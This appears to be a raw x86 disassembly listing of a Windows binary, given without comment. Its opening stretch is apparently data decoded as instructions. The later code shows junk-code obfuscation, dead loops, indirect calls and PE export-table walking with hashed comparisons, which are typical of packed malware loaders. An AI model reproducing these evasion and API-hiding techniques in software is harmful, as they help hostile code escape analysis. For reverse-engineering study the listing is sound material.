  41e129:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e12a:	mov    dl,0xe7
  41e12c:	push   0x43ed4c57
  41e131:	dec    ecx
  41e132:	inc    edi
  41e133:	push   es
  41e134:	int3   
  41e135:	mov    dh,0x6
  41e137:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e138:	or     DWORD PTR [esi+edi*8-0x6a],eax
  41e13c:	pop    ecx
  41e13d:	es mov ecx,0x66c82ac6
  41e143:	and    DWORD PTR [edi+0x29],eax
  41e146:	div    DWORD PTR [eax-0x8]
  41e149:	push   esi
  41e14a:	out    dx,eax
  41e14b:	aas    
  41e14c:	sub    ch,BYTE PTR [eax+0x2d]
  41e14f:	xor    esi,DWORD PTR [esi-0x34]
  41e152:	aas    
  41e153:	imul   DWORD PTR [ecx]
  41e155:	add    bh,BYTE PTR ds:0xfd423b72
  41e15b:	das    
  41e15c:	add    BYTE PTR [ecx-0x3c1d1449],bh
  41e162:	xchg   ebp,eax
  41e163:	lds    edx,FWORD PTR [eax]
  41e165:	je     0x41e1e0
  41e167:	and    eax,0x5e06050b
  41e16c:	inc    edi
  41e16d:	and    eax,DWORD PTR [edi-0x7f]
  41e170:	fcmovne st,st(7)
  41e172:	sbb    DWORD PTR [esp+esi*4+0x2cd255fa],ecx
  41e179:	ds (bad) 
  41e17b:	(bad)  
  41e17c:	popf   
  41e17d:	sbb    edx,ecx
  41e17f:	nop
  41e180:	fisttp QWORD PTR [eax+0x1]
  41e183:	fdiv   DWORD PTR [edi-0x80]
  41e186:	femms  
  41e188:	inc    ebp
  41e189:	(bad)  
  41e18d:	xchg   ebp,eax
  41e18e:	mov    edx,gs
  41e190:	mov    ds:0xb9bf85e7,al
  41e195:	mov    ebp,0xb4c438c4
  41e19a:	retf   
  41e19b:	xchg   ecx,eax
  41e19c:	jmp    0x1950255
  41e1a1:	aam    0xf6
  41e1a3:	loopne 0x41e19e
  41e1a5:	push   esi
  41e1a6:	sbb    cl,BYTE PTR [edi]
  41e1a8:	sbb    DWORD PTR [eax],0xffffffeb
  41e1ab:	pushw  0xffcc
  41e1ae:	dec    edx
  41e1af:	dec    ebp
  41e1b0:	mov    cl,0xcc
  41e1b2:	sti    
  41e1b3:	cdq    
  41e1b4:	fild   WORD PTR gs:[edi]
  41e1b7:	pop    edi
  41e1b8:	xor    dl,BYTE PTR [ecx]
  41e1ba:	out    dx,al
  41e1bb:	out    dx,eax
  41e1bc:	outs   dx,BYTE PTR ds:[esi]
  41e1bd:	dec    ecx
  41e1be:	add    DWORD PTR [ecx],edi
  41e1c0:	jle    0x41e148
  41e1c2:	add    BYTE PTR [edx-0x546e809d],bl
  41e1c8:	repnz fs aam 0xab
  41e1cc:	out    0x42,eax
  41e1ce:	mov    dl,0xe6
  41e1d0:	xor    eax,0x47395040
  41e1d5:	dec    ebp
  41e1d6:	ja     0x41e15e
  41e1d8:	and    esp,DWORD PTR [edi-0x31b47c38]
  41e1de:	(bad)  
  41e1df:	call   0x82ba1c12
  41e1e4:	sbb    al,0x41
  41e1e6:	xchg   edi,eax
  41e1e7:	fsub   DWORD PTR [esi]
  41e1e9:	dec    esi
  41e1ea:	dec    edi
  41e1eb:	xor    ah,BYTE PTR [ecx]
  41e1ed:	xor    bl,BYTE PTR [edi-0x55443b03]
  41e1f3:	and    BYTE PTR ds:0xe7b05227,ah
  41e1f9:	retf   
  41e1fa:	call   0xe66a:0x1c110b39
  41e201:	adc    DWORD PTR [ebx-0x77d459af],esi
  41e207:	xchg   edx,eax
  41e208:	outs   dx,BYTE PTR ds:[esi]
  41e209:	add    BYTE PTR [edx-0x6a598633],cl
  41e20f:	data16 sbb bl,BYTE PTR ss:[esi]
  41e213:	pop    esp
  41e214:	pop    ebx
  41e215:	add    edx,esp
  41e217:	in     al,0xdf
  41e219:	(bad)  
  41e21a:	push   0xffffffa7
  41e21c:	push   ecx
  41e21d:	pop    esp
  41e21e:	(bad)  
  41e21f:	xchg   edi,eax
  41e220:	es (bad) 
  41e222:	rol    ebp,1
  41e224:	out    0x21,eax
  41e226:	inc    ebp
  41e227:	pushf  
  41e228:	ds xor ch,ch
  41e22b:	ficom  WORD PTR [edx+0x3e]
  41e22e:	mov    bh,0x50
  41e230:	int    0x9f
  41e232:	cmp    al,0x8b
  41e234:	test   al,0x7f
  41e236:	aaa    
  41e237:	dec    edi
  41e238:	sar    BYTE PTR [esi-0x23],cl
  41e23b:	add    al,0x68
  41e23e:	adc    BYTE PTR [ebx-0x9],0xf
  41e242:	sub    DWORD PTR [edx],ecx
  41e244:	fstp   DWORD PTR [edx+ecx*4-0x775fab83]
  41e24b:	sub    eax,0xbcfb6974
  41e250:	mov    edx,0x68ae7c20
  41e255:	rol    DWORD PTR [edx*2+0x1db90d16],1
  41e25c:	pop    esi
  41e25d:	(bad)  
  41e25e:	pop    ebx
  41e25f:	ins    BYTE PTR es:[edi],dx
  41e260:	xor    ebx,ebx
  41e262:	lods   eax,DWORD PTR ds:[esi]
  41e263:	add    al,0x4c
  41e265:	adc    ecx,0x4e
  41e268:	aas    
  41e269:	mov    bl,0xcb
  41e26b:	mov    al,ds:0x1b13119e
  41e270:	aas    
  41e271:	inc    ebp
  41e272:	push   esi
  41e273:	ror    esi,cl
  41e275:	je     0x41e1f8
  41e277:	jle    0x41e2d7
  41e279:	sbb    ebx,DWORD PTR [edx+ebx*8+0xb]
  41e27d:	nop
  41e27e:	cmp    eax,0x630c80ea
  41e283:	in     eax,dx
  41e284:	mov    ah,0x29
  41e286:	lea    esi,[esi+0x3f8bd539]
  41e28c:	pop    edx
  41e28d:	ror    BYTE PTR [ecx-0x480f1372],1
  41e293:	or     esp,DWORD PTR [edi-0x185d8e8c]
  41e299:	outs   dx,BYTE PTR ds:[esi]
  41e29a:	loope  0x41e242
  41e29c:	das    
  41e29d:	(bad)  
  41e29e:	and    eax,0x3af3b19
  41e2a3:	loopne 0x41e260
  41e2a5:	in     eax,dx
  41e2a6:	sub    DWORD PTR [esi+0x512382ae],edx
  41e2ac:	xor    esi,DWORD PTR [ecx]
  41e2ae:	enter  0xfec5,0xbb
  41e2b2:	inc    ebx
  41e2b3:	and    al,0x48
  41e2b5:	or     ebp,DWORD PTR [edi+0x78667de9]
  41e2bb:	push   0x72
  41e2bd:	hlt    
  41e2be:	sub    dl,dl
  41e2c0:	pop    esi
  41e2c1:	aas    
  41e2c2:	lods   eax,DWORD PTR ds:[esi]
  41e2c3:	sub    esi,DWORD PTR [edi+0x25]
  41e2c6:	ret    
  41e2c7:	push   ebp
  41e2c8:	inc    ebp
  41e2c9:	sbb    esp,esi
  41e2cb:	sub    esi,DWORD PTR [ebx-0x25]
  41e2ce:	push   esp
  41e2cf:	mov    edi,0x39352359
  41e2d4:	loopne 0x41e31f
  41e2d6:	mov    DWORD PTR [edx+0x618e7e2a],esp
  41e2dc:	and    DWORD PTR [ecx+0x74],edx
  41e2df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2e0:	adc    DWORD PTR [edi+ecx*4],eax
  41e2e3:	jo     0x41e311
  41e2e5:	cld    
  41e2e6:	adc    bl,BYTE PTR [ecx-0x92c5a97]
  41e2ec:	fwait
  41e2ed:	into   
  41e2ee:	pop    es
  41e2ef:	popa   
  41e2f0:	(bad)  
  41e2f1:	sbb    eax,0x1a263099
  41e2f6:	inc    eax
  41e2f7:	dec    eax
  41e2f8:	push   edx
  41e2f9:	sbb    dl,BYTE PTR [edi+0x4abe0ed7]
  41e2ff:	adc    eax,0x588996e5
  41e304:	ins    DWORD PTR es:[edi],dx
  41e305:	cli    
  41e306:	bound  ebx,QWORD PTR [edi]
  41e308:	xchg   ecx,eax
  41e309:	pop    ss
  41e30a:	jle    0x41e2ef
  41e30c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e30d:	loopne 0x41e2a9
  41e30f:	outs   dx,DWORD PTR ds:[esi]
  41e310:	inc    eax
  41e311:	pop    esp
  41e312:	clc    
  41e313:	adc    bh,0x93
  41e316:	mov    eax,0x3f8b6f30
  41e31b:	mov    ebx,DWORD PTR [eax+0x3c]
  41e31e:	lea    edi,[ebx+edi*8+0x78]
  41e322:	mov    edi,DWORD PTR [edi+eax*1]
  41e325:	mov    DWORD PTR [ebp-0x18],edi
  41e328:	mov    edi,DWORD PTR [ebp+0x8]
  41e32b:	xor    edi,ecx
  41e32d:	add    edi,edx
  41e32f:	mov    DWORD PTR [ebp-0x1c],edi
  41e332:	mov    edi,DWORD PTR [ebp+0x8]
  41e335:	xor    edi,ecx
  41e337:	mov    ecx,DWORD PTR [ebp-0x18]
  41e33a:	add    edi,edx
  41e33c:	cmp    ecx,edi
  41e33e:	je     0x41e380
  41e344:	mov    ecx,DWORD PTR [ebp-0x18]
  41e347:	add    ecx,eax
  41e349:	mov    DWORD PTR [ebp-0x1c],ecx
  41e34c:	mov    ecx,DWORD PTR [ebp-0x30]
  41e34f:	mov    edx,DWORD PTR [ebp-0x2c]
  41e352:	mov    edx,0xa145
  41e357:	xor    cx,dx
  41e35a:	mov    edx,DWORD PTR [ebp-0x1c]
  41e35d:	mov    edx,DWORD PTR [edx+0xc]
  41e360:	add    cx,si
  41e363:	cmp    WORD PTR [eax+edx*1],cx
  41e367:	jne    0x41e380
  41e36d:	mov    ecx,DWORD PTR ds:0x428365
  41e373:	mov    ecx,DWORD PTR [ecx+0x198]
  41e379:	mov    DWORD PTR [ecx],eax
  41e37b:	jmp    0x41e3db
  41e380:	push   DWORD PTR [ebp+0x1c]
  41e383:	push   DWORD PTR [ebp+0x18]
  41e386:	jmp    0x41e3ca
  41e38b:	mov    eax,DWORD PTR [ebp+0x18]
  41e38e:	mov    ecx,DWORD PTR [ebp+0x1c]
  41e391:	cmp    eax,0x70941f92
  41e396:	jne    0x41e3af
  41e39c:	cmp    ecx,ebx
  41e39e:	jne    0x41e3af
  41e3a4:	push   ebx
  41e3a5:	push   0x70941f9c
  41e3aa:	jmp    0x41e3ca
  41e3af:	mov    eax,DWORD PTR [ebp+0x18]
  41e3b2:	mov    ecx,DWORD PTR [ebp+0x1c]
  41e3b5:	cmp    eax,0x70941f9c
  41e3ba:	jne    0x41e3db
  41e3c0:	cmp    ecx,ebx
  41e3c2:	jne    0x41e3db
  41e3c8:	push   ebx
  41e3c9:	push   edi
  41e3ca:	push   DWORD PTR [ebp+0x14]
  41e3cd:	push   DWORD PTR [ebp+0x10]
  41e3d0:	push   DWORD PTR [ebp+0xc]
  41e3d3:	push   DWORD PTR [ebp+0x8]
  41e3d6:	call   0x417181
  41e3db:	pop    edi
  41e3dc:	pop    esi
  41e3dd:	pop    ebx
  41e3de:	leave  
  41e3df:	ret    0x18
  41e3e2:	push   ebp
  41e3e3:	mov    ebp,esp
  41e3e5:	and    esp,0xfffffff8
  41e3e8:	sub    esp,0xcc
  41e3ee:	mov    al,ds:0x42848a
  41e3f3:	push   ebx
  41e3f4:	mov    DWORD PTR ds:0x428e39,0x550e
  41e3fe:	push   esi
  41e3ff:	mov    DWORD PTR ds:0x428e29,0x154d
  41e409:	push   edi
  41e40a:	mov    DWORD PTR ds:0x428e49,0x193
  41e414:	mov    BYTE PTR [esp+0xd6],0x0
  41e41c:	cmp    al,BYTE PTR ds:0x428497
  41e422:	je     0x41e439
  41e428:	xor    eax,eax
  41e42a:	mov    DWORD PTR ds:0x428e81,0x6e70
  41e434:	jmp    0x41f510
  41e439:	mov    al,ds:0x4284a3
  41e43e:	mov    DWORD PTR ds:0x428ecd,0xf87
  41e448:	cmp    al,BYTE PTR ds:0x4284b4
  41e44e:	jne    0x41e428
  41e454:	mov    edi,DWORD PTR ds:0x42ca5c
  41e45a:	push   0x4284bd
  41e45f:	adc    DWORD PTR ds:0x428e35,0x428eb9
  41e469:	push   0x4284c9
  41e46e:	call   edi
  41e470:	sbb    DWORD PTR ds:0x428e45,0x428eb5
  41e47a:	test   eax,eax
  41e47c:	mov    DWORD PTR ds:0x428e85,0x5858
  41e486:	je     0x41e428
  41e48c:	push   0x1
  41e48e:	and    DWORD PTR ds:0x428e85,0x768a
  41e498:	push   0x9765765
  41e49d:	call   DWORD PTR ds:0x42ca34
  41e4a3:	and    DWORD PTR ds:0x428e49,0x546c
  41e4ad:	push   0x4284d9
  41e4b2:	sub    DWORD PTR ds:0x428e55,0x3ef4
  41e4bc:	lea    eax,[esp+0x5c]
  41e4c0:	adc    DWORD PTR ds:0x428ecd,0x2de
  41e4ca:	push   eax
  41e4cb:	xor    DWORD PTR ds:0x428e65,0x1e99
  41e4d5:	call   DWORD PTR ds:0x42ca44
  41e4db:	add    DWORD PTR ds:0x428e9d,edi
  41e4e1:	mov    DWORD PTR [esp+0x30],0x0
  41e4e9:	or     edx,esi
  41e4eb:	mov    ecx,0xf89c85b9
  41e4f0:	adc    edx,edx
  41e4f2:	mov    DWORD PTR [esp+0x28],ecx
  41e4f6:	mov    DWORD PTR [esp+0xc],0xf89c85b8
  41e4fe:	dec    esi
  41e4ff:	lea    eax,[esp+0x3c]
  41e503:	and    DWORD PTR ds:0x428ea9,0x0
  41e50d:	xor    edx,edx
  41e50f:	add    edx,DWORD PTR ds:0x428ea9
  41e515:	inc    edx
  41e516:	mov    DWORD PTR ds:0x428ea9,edx
  41e51c:	cmp    DWORD PTR ds:0x428ea9,0x21
  41e523:	jle    0x41e54e
  41e529:	jmp    0x41e541
  41e52e:	push   0x428124
  41e533:	push   DWORD PTR [ebp-0x14]
  41e536:	push   0x1e1e
  41e53b:	call   DWORD PTR ds:0x42ca60
  41e541:	cmp    DWORD PTR ds:0x428ea9,0x17
  41e548:	jb     0x41e50d
  41e54e:	mov    DWORD PTR [esp+0x30],eax
  41e552:	adc    esi,DWORD PTR ds:0x428ead
  41e558:	lea    eax,[esp+0x38]
  41e55c:	and    DWORD PTR ds:0x428e89,0x0
  41e566:	jmp    0x41e578
  41e56b:	mov    ebx,DWORD PTR ds:0x428e89
  41e571:	inc    ebx
  41e572:	mov    DWORD PTR ds:0x428e89,ebx
  41e578:	cmp    DWORD PTR ds:0x428e89,0x11
  41e57f:	jae    0x41e5ca
  41e585:	cmp    DWORD PTR ds:0x428e89,0x5
  41e58c:	jb     0x41e5ca
  41e592:	jmp    0x41e5ab
  41e597:	push   0x42814e
  41e59c:	push   DWORD PTR [ebp-0x24]
  41e59f:	push   DWORD PTR [ebp-0x10]
  41e5a2:	push   DWORD PTR [ebp-0x18]
  41e5a5:	call   DWORD PTR ds:0x42ca64
  41e5ab:	cmp    DWORD PTR ds:0x428e89,0x4
  41e5b2:	jne    0x41e5c5
  41e5b8:	mov    ebx,DWORD PTR ds:0x428e89
  41e5be:	inc    ebx
  41e5bf:	mov    DWORD PTR ds:0x428e89,ebx
  41e5c5:	jmp    0x41e56b
  41e5ca:	mov    DWORD PTR [esp+0x18],eax
  41e5ce:	xor    esi,esi
  41e5d0:	or     esi,DWORD PTR ds:0x428eb9
  41e5d6:	or     DWORD PTR ds:0x428e25,esi
  41e5dc:	mov    eax,ds:0x428365
  41e5e1:	mov    eax,DWORD PTR [eax+0x1c8]
  41e5e7:	mov    eax,DWORD PTR [eax]
  41e5e9:	mov    DWORD PTR ds:0x428e9d,0x1c
  41e5f3:	cmp    DWORD PTR ds:0x428e9d,0x0
  41e5fa:	je     0x41e64a
  41e600:	cmp    DWORD PTR ds:0x428e9d,0x3
  41e607:	jl     0x41e64a
  41e60d:	jmp    0x41e61e
  41e612:	push   DWORD PTR [ebp-0x24]
  41e615:	push   DWORD PTR [ebp-0x28]
  41e618:	call   DWORD PTR ds:0x42ca18
  41e61e:	cmp    DWORD PTR ds:0x428e9d,0x4
  41e625:	jne    0x41e638
  41e62b:	mov    ebx,DWORD PTR ds:0x428e9d
  41e631:	dec    ebx
  41e632:	mov    DWORD PTR ds:0x428e9d,ebx
  41e638:	mov    ebx,DWORD PTR ds:0x428e9d
  41e63e:	dec    ebx
  41e63f:	mov    DWORD PTR ds:0x428e9d,ebx
  41e645:	jmp    0x41e5f3
  41e64a:	mov    edx,DWORD PTR [esp+0x18]
  41e64e:	adc    DWORD PTR ds:0x428ec9,edi
  41e654:	mov    esi,0x75108b1
  41e659:	sub    ebx,0x34f9
  41e65f:	xor    eax,esi
  41e661:	add    DWORD PTR ds:0x428e39,0x7d93
  41e66b:	mov    ebx,0x3272f8
  41e670:	or     DWORD PTR ds:0x428e6d,0x428e29
  41e67a:	add    eax,ebx
  41e67c:	mov    DWORD PTR ds:0x428e35,0x4692
  41e686:	mov    DWORD PTR [edx],eax
  41e688:	not    eax
  41e68a:	mov    eax,ds:0x428ce5
  41e68f:	cmp    eax,0x455dedfa
  41e694:	jne    0x41e6fe
  41e69a:	neg    eax
  41e69c:	mov    eax,DWORD PTR [esp+0x28]
  41e6a0:	mov    edx,DWORD PTR ds:0x428365
  41e6a6:	xor    DWORD PTR ds:0x428e91,0x428ebd
  41e6b0:	mov    edx,DWORD PTR [edx+0x198]
  41e6b6:	xor    eax,esi
  41e6b8:	add    DWORD PTR ds:0x428e9d,0x1078
  41e6c2:	add    eax,ebx
  41e6c4:	add    DWORD PTR ds:0x428e89,0x4c2a
  41e6ce:	mov    DWORD PTR [edx],eax
  41e6d0:	mov    eax,DWORD PTR [esp+0x28]
  41e6d4:	xor    eax,esi
  41e6d6:	add    eax,ebx
  41e6d8:	mov    ds:0x428ce5,eax
  41e6dd:	mov    eax,DWORD PTR [esp+0x28]
  41e6e1:	sub    DWORD PTR ds:0x428e41,0x428ec9
  41e6eb:	xor    eax,esi
  41e6ed:	add    eax,ebx
  41e6ef:	or     DWORD PTR ds:0x428e45,0x428e35
  41e6f9:	mov    ds:0x42845d,eax
  41e6fe:	and    DWORD PTR ds:0x428e85,0x0
  41e708:	jmp    0x41e718
  41e70d:	mov    eax,ds:0x428e85
  41e712:	inc    eax
  41e713:	mov    ds:0x428e85,eax
  41e718:	cmp    DWORD PTR ds:0x428e85,0x15
  41e71f:	jae    0x41e74a
  41e725:	cmp    DWORD PTR ds:0x428e85,0x18
  41e72c:	jg     0x41e74a
  41e732:	jmp    0x41e745
  41e737:	push   0x467c
  41e73c:	push   DWORD PTR [ebp-0x14]
  41e73f:	call   DWORD PTR ds:0x42ca1c
  41e745:	jmp    0x41e70d
  41e74a:	mov    eax,ds:0x428365
  41e74f:	mov    eax,DWORD PTR [eax+0x18c]
  41e755:	mov    eax,DWORD PTR [eax]
  41e757:	sbb    DWORD PTR ds:0x428eb1,0x2dbb
  41e761:	mov    DWORD PTR [esp+0x40],eax
  41e765:	movzx  eax,WORD PTR ds:0x428ea5
  41e76c:	sub    DWORD PTR ds:0x428e6d,eax
  41e772:	mov    eax,0xf89c85bd
  41e777:	mov    DWORD PTR [esp+0x10],eax
  41e77b:	mov    DWORD PTR [esp+0x10],eax
  41e77f:	mov    DWORD PTR [esp+0x10],eax
  41e783:	add    DWORD PTR ds:0x428e65,0x428e6d
  41e78d:	mov    DWORD PTR [esp+0x10],ecx
  41e791:	sub    DWORD PTR ds:0x428e5d,0x428e6d
  41e79b:	mov    DWORD PTR [esp+0x18],eax
  41e79f:	mov    DWORD PTR [esp+0x18],0xf89c85a1
  41e7a7:	mov    eax,ds:0x428ec1
  41e7ac:	add    DWORD PTR ds:0x428e89,eax
  41e7b2:	mov    eax,DWORD PTR [esp+0x28]
  41e7b6:	xor    eax,esi
  41e7b8:	add    eax,ebx
  41e7ba:	jmp    0x41e98b
  41e7bf:	mov    al,ds:0x4284de
  41e7c4:	cmp    al,BYTE PTR ds:0x4284eb
  41e7ca:	jne    0x41e428
  41e7d0:	mov    al,ds:0x4284f7
  41e7d5:	cmp    al,BYTE PTR ds:0x428508
  41e7db:	mov    DWORD PTR ds:0x428ea1,0x1959
  41e7e5:	jne    0x41e428
  41e7eb:	push   0x428511
  41e7f0:	xor    DWORD PTR ds:0x428e5d,0x2e26
  41e7fa:	push   0x42851d
  41e7ff:	call   edi
  41e801:	or     DWORD PTR ds:0x428e59,0x428eb9
  41e80b:	test   eax,eax
  41e80d:	mov    DWORD PTR ds:0x428e99,0x6eaa
  41e817:	je     0x41e428
  41e81d:	mov    al,ds:0x42852e
  41e822:	cmp    al,BYTE PTR ds:0x42853b
  41e828:	mov    DWORD PTR ds:0x428e4d,0x38ed
  41e832:	jne    0x41e428
  41e838:	mov    DWORD PTR ds:0x428e65,0x1c9c
  41e842:	mov    al,ds:0x428547
  41e847:	mov    DWORD PTR ds:0x428ecd,0x75a8
  41e851:	cmp    al,BYTE PTR ds:0x428558
  41e857:	mov    DWORD PTR ds:0x428e71,0x3bcf
  41e861:	jne    0x41e428
  41e867:	adc    DWORD PTR ds:0x428ead,0x428ebd
  41e871:	push   0x428561
  41e876:	inc    DWORD PTR ds:0x428ec1
  41e87c:	push   0x42856d
  41e881:	call   edi
  41e883:	test   eax,eax
  41e885:	mov    DWORD PTR ds:0x428e31,0x5531
  41e88f:	je     0x41e428
  41e895:	sub    eax,0x55e1
  41e89a:	mov    eax,DWORD PTR [esp+0xc]
  41e89e:	sbb    DWORD PTR ds:0x428ea1,0x6f3f
  41e8a8:	mov    ecx,DWORD PTR [esp+0x18]
  41e8ac:	add    DWORD PTR ds:0x428e8d,0x428e31
  41e8b6:	xor    eax,esi
  41e8b8:	adc    DWORD PTR ds:0x428e79,0x1de7
  41e8c2:	lea    eax,[eax+ecx*1+0x3272f8]
  41e8c9:	push   eax
  41e8ca:	mov    eax,DWORD PTR [esp+0x14]
  41e8ce:	and    DWORD PTR ds:0x428e61,0x6940
  41e8d8:	xor    eax,esi
  41e8da:	xor    DWORD PTR ds:0x428e85,0x2762
  41e8e4:	lea    eax,[ebp+eax*1+0x327300]
  41e8eb:	push   eax
  41e8ec:	xor    eax,0x37bf
  41e8f1:	mov    eax,ds:0x428365
  41e8f6:	push   DWORD PTR [eax+0x1bc]
  41e8fc:	xor    DWORD PTR ds:0x428e49,0x22e4
  41e906:	call   0x41f519
  41e90b:	xor    edx,edx
  41e90d:	xor    edx,DWORD PTR ds:0x428eed
  41e913:	mov    ecx,DWORD PTR ds:0x428efd
  41e919:	sub    ecx,edx
  41e91b:	sub    edx,DWORD PTR [edx+ecx*1]
  41e91e:	mov    eax,DWORD PTR [esp+0xc]
  41e922:	and    DWORD PTR ds:0x428ebd,0x0
  41e92c:	jmp    0x41e940
  41e931:	xor    edx,edx
  41e933:	add    edx,DWORD PTR ds:0x428ebd
  41e939:	inc    edx
  41e93a:	mov    DWORD PTR ds:0x428ebd,edx
  41e940:	cmp    DWORD PTR ds:0x428ebd,0x12
  41e947:	jae    0x41e972
  41e94d:	cmp    DWORD PTR ds:0x428ebd,0x1a
  41e954:	jbe    0x41e972
  41e95a:	jmp    0x41e96d
  41e95f:	push   0x4280ab
  41e964:	push   DWORD PTR [ebp-0x24]
  41e967:	call   DWORD PTR ds:0x42ca20
  41e96d:	jmp    0x41e931
  41e972:	mov    ecx,DWORD PTR [esp+0x18]
  41e976:	add    DWORD PTR ds:0x428ebd,edi
  41e97c:	xor    eax,esi
  41e97e:	xor    edx,DWORD PTR ds:0x428eb1
  41e984:	lea    eax,[ecx+eax*1+0x3272f8]
  41e98b:	and    DWORD PTR ds:0x428e29,0x0
  41e995:	jmp    0x41e9a9
  41e99a:	xor    ecx,ecx
  41e99c:	add    ecx,DWORD PTR ds:0x428e29
  41e9a2:	inc    ecx
  41e9a3:	mov    DWORD PTR ds:0x428e29,ecx
  41e9a9:	cmp    DWORD PTR ds:0x428e29,0x1b
  41e9b0:	jae    0x41e9f5
  41e9b6:	cmp    DWORD PTR ds:0x428e29,0x4
  41e9bd:	jbe    0x41e9f5
  41e9c3:	jmp    0x41e9d6
  41e9c8:	push   0x428092
  41e9cd:	push   DWORD PTR [ebp-0x1c]
  41e9d0:	call   DWORD PTR ds:0x42ca24
  41e9d6:	cmp    DWORD PTR ds:0x428e29,0x3
  41e9dd:	jne    0x41e9f0
  41e9e3:	mov    ecx,DWORD PTR ds:0x428e29
  41e9e9:	inc    ecx
  41e9ea:	mov    DWORD PTR ds:0x428e29,ecx
  41e9f0:	jmp    0x41e99a
  41e9f5:	mov    ecx,DWORD PTR [esp+0xc]
  41e9f9:	mov    edx,DWORD PTR [esp+0xc]
  41e9fd:	and    DWORD PTR ds:0x428e81,0x27c9
  41ea07:	xor    edx,esi
  41ea09:	xor    ecx,esi
  41ea0b:	add    ecx,edx
  41ea0d:	and    DWORD PTR ds:0x428eb9,0x0
  41ea17:	mov    edx,DWORD PTR ds:0x428eb9
  41ea1d:	inc    edx
  41ea1e:	mov    DWORD PTR ds:0x428eb9,edx
  41ea24:	cmp    DWORD PTR ds:0x428eb9,0x23
  41ea2b:	jle    0x41ea4e
  41ea31:	jmp    0x41ea41
  41ea36:	push   0x3c70
  41ea3b:	call   DWORD PTR ds:0x42ca28
  41ea41:	cmp    DWORD PTR ds:0x428eb9,0x1b
  41ea48:	jb     0x41ea17
  41ea4e:	mov    edx,DWORD PTR [esp+0xc]
  41ea52:	adc    DWORD PTR ds:0x428ec9,0x428ecd
  41ea5c:	xor    edx,esi
  41ea5e:	mov    DWORD PTR ds:0x428e85,0x69c
  41ea68:	lea    ecx,[ecx+edx*1+0x9758e8]
  41ea6f:	mov    DWORD PTR ds:0x428ec1,0x5f48
  41ea79:	mov    DWORD PTR [esp+0x18],eax
  41ea7d:	mov    DWORD PTR ds:0x428e41,0x5aa0
  41ea87:	cmp    eax,ecx
  41ea89:	mov    DWORD PTR ds:0x428e69,0x3a73
  41ea93:	jbe    0x41e7bf
  41ea99:	and    ecx,DWORD PTR ds:0x428ed1
  41ea9f:	mov    eax,DWORD PTR [ebp+0xc]
  41eaa2:	mov    DWORD PTR ds:0x428e9d,0x14
  41eaac:	cmp    DWORD PTR ds:0x428e9d,0x0
  41eab3:	je     0x41eb02
  41eab9:	cmp    DWORD PTR ds:0x428e9d,0x3
  41eac0:	jb     0x41eb02
  41eac6:	jmp    0x41ead4
  41eacb:	push   DWORD PTR [ebp-0x18]
  41eace:	call   DWORD PTR ds:0x42ca2c
  41ead4:	cmp    DWORD PTR ds:0x428e9d,0x4
  41eadb:	jne    0x41eaee
  41eae1:	mov    ecx,DWORD PTR ds:0x428e9d
  41eae7:	dec    ecx
  41eae8:	mov    DWORD PTR ds:0x428e9d,ecx
  41eaee:	xor    ecx,ecx
  41eaf0:	add    ecx,DWORD PTR ds:0x428e9d
  41eaf6:	dec    ecx
  41eaf7:	mov    DWORD PTR ds:0x428e9d,ecx
  41eafd:	jmp    0x41eaac
  41eb02:	mov    ds:0x4281e9,eax
  41eb07:	sbb    eax,eax
  41eb09:	mov    eax,DWORD PTR [ebp+0x10]
  41eb0c:	mov    ds:0x428445,eax
  41eb11:	mov    eax,ds:0x4281e9
  41eb16:	mov    ecx,DWORD PTR [esp+0x30]
  41eb1a:	dec    DWORD PTR ds:0x428e99
  41eb20:	sub    eax,ebx
  41eb22:	xor    eax,esi
  41eb24:	mov    DWORD PTR ds:0x428e99,0x6c0e
  41eb2e:	mov    DWORD PTR [ecx],eax
  41eb30:	lea    eax,[esp+0x24]
  41eb34:	mov    DWORD PTR ds:0x428ea5,0x17d
  41eb3e:	mov    DWORD PTR [esp+0x44],eax
  41eb42:	lea    eax,[ebp+0x4]
  41eb45:	mov    DWORD PTR ds:0x428ec5,0x4441
  41eb4f:	mov    DWORD PTR [esp+0x24],eax
  41eb53:	mov    al,ds:0x42857e
  41eb58:	mov    DWORD PTR ds:0x428e49,0x46bb
  41eb62:	cmp    al,BYTE PTR ds:0x42858b
  41eb68:	jne    0x41e428
  41eb6e:	mov    al,ds:0x428597
  41eb73:	mov    DWORD PTR ds:0x428eb1,0x61de
  41eb7d:	cmp    al,BYTE PTR ds:0x4285a8
  41eb83:	mov    DWORD PTR ds:0x428e71,0x1a2b
  41eb8d:	jne    0x41e428
  41eb93:	push   0x4285b1
  41eb98:	sbb    DWORD PTR ds:0x428e8d,0x428e79
  41eba2:	push   0x4285bd
  41eba7:	sbb    DWORD PTR ds:0x428e75,0x428e6d
  41ebb1:	call   edi
  41ebb3:	or     DWORD PTR ds:0x428e9d,0x2f2b
  41ebbd:	test   eax,eax
  41ebbf:	je     0x41e428
  41ebc5:	mov    DWORD PTR ds:0x428ec5,0x7907
  41ebcf:	mov    al,ds:0x4285ce
  41ebd4:	cmp    al,BYTE PTR ds:0x4285db
  41ebda:	mov    DWORD PTR ds:0x428e5d,0x5f7d
  41ebe4:	jne    0x41e428
  41ebea:	mov    DWORD PTR ds:0x428e3d,0x1797
  41ebf4:	mov    al,ds:0x4285e7
  41ebf9:	cmp    al,BYTE PTR ds:0x4285f8
  41ebff:	jne    0x41e428
  41ec05:	add    DWORD PTR ds:0x428ec1,0x428ead
  41ec0f:	push   0x428601
  41ec14:	push   0x42860d
  41ec19:	call   edi
  41ec1b:	test   eax,eax
  41ec1d:	mov    DWORD PTR ds:0x428e69,0x333a
  41ec27:	je     0x41e428
  41ec2d:	mov    al,ds:0x42861e
  41ec32:	cmp    al,BYTE PTR ds:0x42862b
  41ec38:	mov    DWORD PTR ds:0x428e65,0x2ea7
  41ec42:	jne    0x41e428
  41ec48:	mov    DWORD PTR ds:0x428e85,0x19a
  41ec52:	mov    al,ds:0x428637
  41ec57:	mov    DWORD PTR ds:0x428ec5,0xb46
  41ec61:	cmp    al,BYTE PTR ds:0x428648
  41ec67:	mov    DWORD PTR ds:0x428e91,0x2cce
  41ec71:	jne    0x41e428
  41ec77:	push   0x428651
  41ec7c:	add    DWORD PTR ds:0x428eb1,0x428ea5
  41ec86:	push   0x42865d
  41ec8b:	call   edi
  41ec8d:	test   eax,eax
  41ec8f:	mov    DWORD PTR ds:0x428e7d,0x28e1
  41ec99:	je     0x41e428
